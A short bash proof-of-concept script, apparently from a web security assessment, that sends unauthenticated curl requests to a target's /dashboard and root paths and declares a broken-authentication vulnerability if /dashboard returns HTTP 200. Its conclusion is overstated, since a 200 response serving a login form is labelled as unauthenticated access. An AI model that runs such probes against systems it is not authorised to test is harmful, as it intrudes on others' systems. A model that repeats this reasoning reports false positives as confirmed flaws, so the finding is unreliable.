#!/bin/bash

# POC: Unauthenticated Access to Dashboard Endpoint
# This script demonstrates that the /dashboard endpoint returns HTTP 200
# instead of properly redirecting or returning 401 Unauthorized

TARGET_URL="${1:-http://localhost}"
DASHBOARD_ENDPOINT="${TARGET_URL}/dashboard"
ROOT_ENDPOINT="${TARGET_URL}/"

echo "=== Unauthenticated Dashboard Access POC ==="
echo ""
echo "[*] Testing unauthenticated access to dashboard endpoint..."
echo "[*] Target: $DASHBOARD_ENDPOINT"
echo ""

# Test dashboard endpoint without authentication
echo "[+] Accessing /dashboard without authentication..."
DASHBOARD_RESPONSE=$(curl -s -w "\n%{http_code}" "$DASHBOARD_ENDPOINT")
DASHBOARD_BODY=$(echo "$DASHBOARD_RESPONSE" | head -n -1)
DASHBOARD_HTTP_CODE=$(echo "$DASHBOARD_RESPONSE" | tail -n 1)

echo "[*] HTTP Status Code: $DASHBOARD_HTTP_CODE"
echo "[*] Response contains login form: $(echo "$DASHBOARD_BODY" | grep -q 'Invalid username' && echo 'YES' || echo 'NO')"
echo ""

# Test root endpoint for comparison
echo "[+] Accessing / (root) without authentication for comparison..."
ROOT_RESPONSE=$(curl -s -w "\n%{http_code}" "$ROOT_ENDPOINT")
ROOT_BODY=$(echo "$ROOT_RESPONSE" | head -n -1)
ROOT_HTTP_CODE=$(echo "$ROOT_RESPONSE" | tail -n 1)

echo "[*] HTTP Status Code: $ROOT_HTTP_CODE"
echo ""

# Analysis
echo "=== ANALYSIS ==="
if [ "$DASHBOARD_HTTP_CODE" == "200" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Dashboard returns HTTP 200 instead of proper auth redirect"
    echo "[!] Expected: HTTP 302/301 redirect to login OR HTTP 401 Unauthorized"
    echo "[!] Actual: HTTP 200 with login form content"
    echo ""
    echo "[*] This indicates broken authentication enforcement at the routing level"
    echo "[*] Unauthenticated users can access the endpoint without being properly blocked"
    exit 0
elif [ "$DASHBOARD_HTTP_CODE" == "302" ] || [ "$DASHBOARD_HTTP_CODE" == "301" ]; then
    echo "[*] Dashboard properly returns redirect ($DASHBOARD_HTTP_CODE)"
    exit 1
elif [ "$DASHBOARD_HTTP_CODE" == "401" ]; then
    echo "[*] Dashboard properly returns 401 Unauthorized"
    exit 1
else
    echo "[*] Unexpected HTTP code: $DASHBOARD_HTTP_CODE"
    exit 2
fi